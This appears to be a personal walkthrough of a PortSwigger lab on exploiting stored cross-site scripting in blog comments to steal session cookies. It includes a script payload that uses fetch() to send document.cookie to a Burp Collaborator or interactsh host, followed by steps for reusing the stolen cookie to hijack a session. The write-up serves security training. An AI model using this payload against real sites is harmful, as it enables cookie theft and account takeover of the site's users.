>>> Platform -> Portswigger
>> ### Target -> Lab: Exploiting cross-site scripting to steal cookies

----
**Where is Vuln**: stored XSS vulnerability in the blog comments function
**Goal** : Steal Cookie and login

----


### Steps:
1. Open the Lab..
2. click any post comment with vannila xss payload
3. Comment field is our endpoint. ![alt text](image.png)
4. this is work ![alt text](image-1.png)
5. lets steal cookie... use burp collabrator ![alt text](image-2.png)  - ![alt text](image-3.png)
6. if your don't have burp pro use [interact.sh](https://app.interactsh.com/) -> ![alt text](image-4.png)
7. steal cookie using fetch() function
```html
<script>fetch('https://Burp_collablink?cookie='+document.cookie);</script>
```
8. ![alt text](image-5.png) now i'm steal cookie
9. ![alt text](image-6.png) go in application tab in paste your session cookie
10. then lab solve ![alt text](image-7.png)
